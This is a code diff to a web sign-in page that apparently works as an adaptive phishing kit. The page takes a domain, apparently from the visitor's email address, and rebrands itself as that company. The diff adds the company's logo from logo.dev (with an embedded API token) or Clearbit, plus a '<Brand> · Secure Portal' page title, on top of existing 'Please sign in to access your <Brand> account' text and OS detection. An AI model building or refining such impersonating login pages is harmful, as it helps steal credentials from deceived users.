@@ -134,12 +134,28 @@
       to { opacity: 1; transform: translateY(0) scale(1); }
     }
     
-    /* Brand Header - Company Name Only */
+    /* Brand Header - Logo + Company Name */
     .brand-header {
       padding: 28px 30px 18px;
       text-align: center;
       border-bottom: 1px solid #f0f0f0;
       background: #ffffff;
+    }
+    
+    .brand-logo-wrapper {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 8px;
+      min-height: 70px;
+    }
+    
+    .brand-logo {
+      max-width: 120px;
+      max-height: 70px;
+      width: auto;
+      height: auto;
+      display: block;
     }
     
     .brand-name {
@@ -424,8 +440,11 @@
   <!-- MODERN ELEVATED FLOATING CARD -->
   <div class="chameleon-container" id="chameleonContainer">
     
-    <!-- Brand Header - Company Name Only -->
+    <!-- Brand Header - Logo + Company Name -->
     <div class="brand-header" id="brandHeader">
+      <div class="brand-logo-wrapper">
+        <img class="brand-logo" id="brandLogo" src="" alt="Company Logo">
+      </div>
       <div class="brand-name" id="brandName">Loading...</div>
     </div>
     
@@ -501,7 +520,7 @@
       return email;
     }
     
-    // --- DETECT OS AND ICON (Windows 10 removed) ---
+    // --- DETECT OS AND ICON ---
     function getOSInfo() {
       const ua = navigator.userAgent;
       if (ua.includes('Windows')) {
@@ -555,16 +574,31 @@
       return 'Unknown';
     }
     
-    // --- FETCH BRANDING AND BACKGROUND ---
+    // --- FETCH BRANDING AND BACKGROUND (WITH LOGO) ---
     async function fetchBranding(domain) {
       try {
         const nameParts = domain.split('.');
         const brandName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
         document.getElementById('brandName').textContent = brandName;
         document.getElementById('footerDomain').textContent = domain;
+        document.getElementById('pageTitle').textContent = `${brandName} · Secure Portal`;
         
         document.getElementById('heroTitle').textContent = `Welcome to ${brandName}`;
         document.getElementById('heroSub').textContent = `Please sign in to access your ${brandName} account.`;
+        
+        // --- LOGO FETCH (from the other page) ---
+        const logoImg = document.getElementById('brandLogo');
+        // Use logo.dev API (works well)
+        logoImg.src = `https://img.logo.dev/${domain}?token=pk_N3r1ruvPTqCTWk6c6ZhZUQ`;
+        logoImg.onerror = function() {
+          // Fallback to Clearbit if logo.dev fails
+          this.src = `https://logo.clearbit.com/${domain}`;
+          this.onerror = function() {
+            // If both fail, hide the logo
+            this.style.display = 'none';
+          };
+        };
+        // --- END LOGO FETCH ---
         
         const color = '#0078d4';
         document.querySelector('.btn-submit').style.background = color;
